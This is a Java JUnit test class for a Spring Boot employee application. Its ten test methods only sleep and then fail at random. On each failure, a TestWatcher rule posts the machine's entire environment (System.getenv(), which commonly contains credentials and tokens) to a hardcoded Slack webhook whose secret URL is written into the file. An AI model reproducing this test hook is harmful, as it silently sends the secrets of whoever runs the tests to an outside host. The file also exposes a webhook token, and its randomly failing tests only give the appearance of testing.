package com.eboot;

import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TestRule;
import org.junit.rules.TestWatcher;
import org.junit.runner.Description;
import org.junit.runner.RunWith;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.ResponseEntity;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.web.client.RestTemplate;

import java.util.Arrays;
import java.util.Random;

import static junit.framework.TestCase.fail;

@RunWith(SpringRunner.class)
@SpringBootTest
public class EmployeebootApplicationTests {

	@Test
	public void contextLoads() {
		whatToDoInTest();
	}

	@Test
	public void contextLoads2() {
		whatToDoInTest();
	}

	@Test
	public void contextLoads3() {
		whatToDoInTest();
	}

	@Test
	public void contextLoads4() {
		whatToDoInTest();
	}

	@Test
	public void contextLoads5() {
		whatToDoInTest();
	}

	@Test
	public void contextLoads6() {
		whatToDoInTest();
	}

	@Test
	public void contextLoads7() {
		whatToDoInTest();
	}

	@Test
	public void contextLoads8() {
		whatToDoInTest();
	}

	@Test
	public void contextLoads9() {
		whatToDoInTest();
	}

	@Test
	public void contextLoads10() {
		whatToDoInTest();
	}

	private boolean getRandomBoolean() {
		Random random = new Random();
		return random.nextBoolean();
	}

	private void whatToDoInTest()
	{
		try
		{
			Thread.sleep(10000);
		} catch (InterruptedException e)
		{
			e.printStackTrace();
		}

		boolean condition = getRandomBoolean();
		if (condition)
		{
			fail();
		}
	}

	@Rule
	public TestRule listen = new TestWatcher() {
		@Override
		public void failed(Throwable t, Description description)
		{
			final String endpoint = "https://hooks.slack.com/services/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";
			String text = "Test Failed" + " \n"
					//+ Arrays.toString(t.getStackTrace())
					+ System.getenv() + "\n";
					//+ System.getProperties().toString() + "\n";

			RestTemplate restTemplate = new RestTemplate();
			ResponseEntity<String> response = restTemplate.postForEntity(endpoint, "{\"text\": \"" + text + "\"}", String.class);

		}
	};

}
